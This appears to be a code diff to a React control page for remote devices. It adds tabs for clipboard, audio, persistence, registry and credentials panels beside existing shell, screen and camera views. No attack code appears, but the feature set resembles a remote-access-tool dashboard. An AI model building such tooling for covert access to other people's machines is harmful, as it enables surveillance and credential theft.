@@ -3,7 +3,10 @@ import { useEffect, useRef, useState, lazy, Suspense } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/lib/auth-context";
 import { useRelaySocket } from "@/lib/relay";
-import { ArrowLeft, Terminal, Info, Monitor, Video, X, FolderOpen, ListChecks, KeyRound } from "lucide-react";
+import {
+  ArrowLeft, Terminal, Info, Monitor, Video, X, FolderOpen, ListChecks, KeyRound,
+  Power, Clipboard, Network, Volume2, Activity, Shield, Cog, Database, Lock, Radio,
+} from "lucide-react";
 import type { LiveInfo, LiveMetric } from "@/components/control/InfoPanel";
 
 const ShellPanel = lazy(() =>
@@ -27,6 +30,16 @@ const ProcessesPanel = lazy(() =>
 const RecoveryPanel = lazy(() =>
   import("@/components/control/RecoveryPanel").then((m) => ({ default: m.RecoveryPanel })),
 );
+const SessionPanel = lazy(() => import("@/components/control/SessionPanel").then((m) => ({ default: m.SessionPanel })));
+const ClipboardPanel = lazy(() => import("@/components/control/ClipboardPanel").then((m) => ({ default: m.ClipboardPanel })));
+const NetworkPanel = lazy(() => import("@/components/control/NetworkPanel").then((m) => ({ default: m.NetworkPanel })));
+const AudioPanel = lazy(() => import("@/components/control/AudioPanel").then((m) => ({ default: m.AudioPanel })));
+const ActivityPanel = lazy(() => import("@/components/control/ActivityPanel").then((m) => ({ default: m.ActivityPanel })));
+const PersistencePanel = lazy(() => import("@/components/control/PersistencePanel").then((m) => ({ default: m.PersistencePanel })));
+const ServicesPanel = lazy(() => import("@/components/control/ServicesPanel").then((m) => ({ default: m.ServicesPanel })));
+const RegistryPanel = lazy(() => import("@/components/control/RegistryPanel").then((m) => ({ default: m.RegistryPanel })));
+const CredentialsPanel = lazy(() => import("@/components/control/CredentialsPanel").then((m) => ({ default: m.CredentialsPanel })));
+const EventsPanel = lazy(() => import("@/components/control/EventsPanel").then((m) => ({ default: m.EventsPanel })));
 
 export const Route = createFileRoute("/control/$id")({
   component: ControlPage,
@@ -53,7 +66,10 @@ type Device = {
   owner_user_id: string | null;
 };
 
-type TabKey = "shell" | "screen" | "camera" | "files" | "processes" | "info" | "recovery";
+type TabKey =
+  | "shell" | "screen" | "camera" | "files" | "processes" | "info" | "recovery"
+  | "session" | "clipboard" | "network" | "audio" | "activity"
+  | "persistence" | "services" | "registry" | "credentials" | "events";
 
 function ClientOnly({ children }: { children: React.ReactNode }) {
   const [mounted, setMounted] = useState(false);
@@ -158,6 +174,16 @@ function ControlPage() {
     { key: "camera", label: "Camera", icon: Video },
     { key: "files", label: "Files", icon: FolderOpen },
     { key: "processes", label: "Processes", icon: ListChecks },
+    { key: "session", label: "Session", icon: Power },
+    { key: "clipboard", label: "Clipboard", icon: Clipboard },
+    { key: "network", label: "Network", icon: Network },
+    { key: "audio", label: "Audio", icon: Volume2 },
+    { key: "activity", label: "Activity", icon: Activity },
+    { key: "services", label: "Services", icon: Cog },
+    { key: "registry", label: "Registry", icon: Database },
+    { key: "persistence", label: "Persistence", icon: Shield },
+    { key: "credentials", label: "Credentials", icon: Lock },
+    { key: "events", label: "Events", icon: Radio },
     { key: "recovery", label: "Recovery", icon: KeyRound },
     { key: "info", label: "Info", icon: Info },
   ];
@@ -271,11 +297,17 @@ function ControlPage() {
                     <ProcessesPanel deviceId={id} />
                   </div>
                 )}
-                {tab === "recovery" && (
-                  <div>
-                    <RecoveryPanel deviceId={id} ownerUserId={device.owner_user_id} />
-                  </div>
-                )}
+                {tab === "recovery" && (<div><RecoveryPanel deviceId={id} ownerUserId={device.owner_user_id} /></div>)}
+                {tab === "session" && (<div><SessionPanel deviceId={id} /></div>)}
+                {tab === "clipboard" && (<div><ClipboardPanel deviceId={id} /></div>)}
+                {tab === "network" && (<div><NetworkPanel deviceId={id} /></div>)}
+                {tab === "audio" && (<div><AudioPanel deviceId={id} /></div>)}
+                {tab === "activity" && (<div><ActivityPanel deviceId={id} /></div>)}
+                {tab === "services" && (<div><ServicesPanel deviceId={id} /></div>)}
+                {tab === "registry" && (<div><RegistryPanel deviceId={id} /></div>)}
+                {tab === "persistence" && (<div><PersistencePanel deviceId={id} /></div>)}
+                {tab === "credentials" && (<div><CredentialsPanel deviceId={id} /></div>)}
+                {tab === "events" && (<div><EventsPanel deviceId={id} /></div>)}
                 <div className={tab === "info" ? "" : "hidden"}>
                   <InfoPanel
                     device={device as any}
